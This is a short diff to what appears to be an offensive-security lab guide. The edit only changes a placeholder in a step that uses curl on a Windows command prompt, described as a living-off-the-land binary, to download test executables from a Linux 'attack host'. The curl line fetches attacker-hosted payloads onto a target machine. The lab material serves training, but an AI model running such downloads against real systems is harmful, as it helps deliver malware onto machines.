@@ -23,7 +23,7 @@
 
 2. Open a command prompt by clicking the search icon in the bottom left and typing `cmd`.
 3. Run the following command with my new favorite living off the land binary for dowloading remote files. 
-`curl http://<NIX-ATTACK-HOST>:8000/test1.exe -o test1.exe`
+`curl http://<NIX-ATTACK-HOST IP HERE>:8000/test1.exe -o test1.exe`
 4. Once you have this worked out, download all the files you created on the linux attack host just changing the file names.
     1. test1.exe
     2. test264.exe
